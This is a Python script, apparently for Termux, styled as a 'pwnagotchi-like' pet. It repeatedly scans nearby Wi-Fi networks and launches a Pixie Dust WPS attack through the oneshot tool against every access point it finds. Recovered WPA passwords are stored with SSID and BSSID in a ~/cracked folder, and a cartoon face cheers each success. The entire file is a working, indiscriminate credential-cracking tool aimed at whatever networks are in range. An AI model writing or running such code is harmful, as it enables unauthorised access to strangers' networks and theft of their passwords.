#!/usr/bin/env python3
"""
pwnagotchi-like Termux app using normal OneShot
All code in one file. Python 3.9+
Features:
  - Scan Wi-Fi every 5s when idle
  - Attempt Pixie Dust attack on each AP with 10s timeout
  - Session counters: scanned APs, cracked networks
  - ASCII pet face reflecting success/failure
  - Save cracked credentials in ~/cracked
"""
import os
import sys
import subprocess
import time
import signal
from datetime import datetime

# ASCII face module
class Face:
    states = {
        'neutral': [
            r"  -   -  ",
            r" ( o   o )",
            r"   \___/  "
        ],
        'happy': [
            r"  ^   ^  ",
            r" ( o ^ o )",
            r"   \___/  "
        ],
        'sad': [
            r"  -   -  ",
            r" ( o . o )",
            r"   \___/  "
        ]
    }

    def __init__(self):
        self.state = 'neutral'

    def set_state(self, state):
        if state in Face.states:
            self.state = state

    def draw(self):
        for line in Face.states[self.state]:
            print(line)

# Config
INTERFACE = os.environ.get('WIFI_INTERFACE', 'wlan0')
CRACKED_DIR = os.path.expanduser('~/cracked')
SCAN_INTERVAL = 5            # seconds between scans when idle
ATTACK_TIMEOUT = 10          # seconds to wait for a crack before moving on
ONESHOT_CMD = 'oneshot'      # command name for normal oneshot

# Ensure cracked directory
os.makedirs(CRACKED_DIR, exist_ok=True)

# Globals for session counters
session_scanned = 0
session_cracked = 0

# Signal handler to kill timed-out attack
class TimeoutException(Exception): pass

def timeout_handler(signum, frame):
    raise TimeoutException()

signal.signal(signal.SIGALRM, timeout_handler)

# Scan for networks with iwlist
def scan_networks(interface):
    try:
        result = subprocess.run(
            ['iwlist', interface, 'scanning'],
            capture_output=True, text=True, check=True
        ).stdout
    except subprocess.CalledProcessError as e:
        print(f"[!] Scan error: {e}")
        return []

    networks = []
    ssid = None
    for line in result.splitlines():
        line = line.strip()
        if line.startswith('Cell') and 'Address:' in line:
            addr = line.split('Address:')[1].strip()
            ssid = None
        elif line.startswith('ESSID:'):
            ssid = line.split(':',1)[1].strip('"')
            if addr and ssid is not None:
                networks.append({'bssid': addr, 'ssid': ssid})
    return networks

# Run oneshot attack on a single AP
def attack_ap(bssid):
    cmd = ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-b', bssid, '-K']
    try:
        # start attack with timeout
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        signal.alarm(ATTACK_TIMEOUT)
        output, _ = proc.communicate()
        signal.alarm(0)
        return output
    except TimeoutException:
        proc.kill()
        print(f"[-] Timeout on {bssid}")
        return ''
    except Exception as e:
        print(f"[!] Attack error on {bssid}: {e}")
        return ''

# Parse output for PSK
def parse_crack(output):
    for line in output.splitlines():
        if 'PSK:' in line:
            pwd = line.split('PSK:')[1].strip()
            return pwd
    return None

# Save cracked password
def save_crack(entry):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    safe_ssid = entry['ssid'].replace(' ', '_')
    filename = f"{timestamp}_{safe_ssid}_{entry['bssid']}.txt"
    path = os.path.join(CRACKED_DIR, filename)
    with open(path, 'w') as f:
        f.write(f"SSID: {entry['ssid']}\nBSSID: {entry['bssid']}\nPassword: {entry['password']}\n")
    print(f"[+] Saved crack to {path}")

# Main loop
def main():
    global session_scanned, session_cracked
    if os.geteuid() != 0:
        print("[!] Please run as root (tsu)")
        sys.exit(1)

    face = Face()
    print("Pwnagotchi-Termux starting...")

    while True:
        # Scan
        networks = scan_networks(INTERFACE)
        count = len(networks)
        session_scanned += count
        print(f"[*] Found {count} networks (Total scanned: {session_scanned})")

        for entry in networks:
            bssid = entry['bssid']
            ssid = entry['ssid']
            print(f"[~] Attacking {ssid} ({bssid})")
            output = attack_ap(bssid)
            pwd = parse_crack(output)
            if pwd:
                session_cracked += 1
                entry['password'] = pwd
                print(f"[+] Cracked {ssid}! (Total cracked: {session_cracked})")
                save_crack(entry)
                face.set_state('happy')
            else:
                print(f"[-] Failed on {ssid}")
                face.set_state('sad')
            # redraw face and session stats
            os.system('clear')
            face.draw()
            print(f"Cracked: {session_cracked} | Scanned: {session_scanned}")

        # idle before next full scan
        print(f"[*] Waiting {SCAN_INTERVAL}s before rescan...")
        time.sleep(SCAN_INTERVAL)

if __name__ == '__main__':
    main()
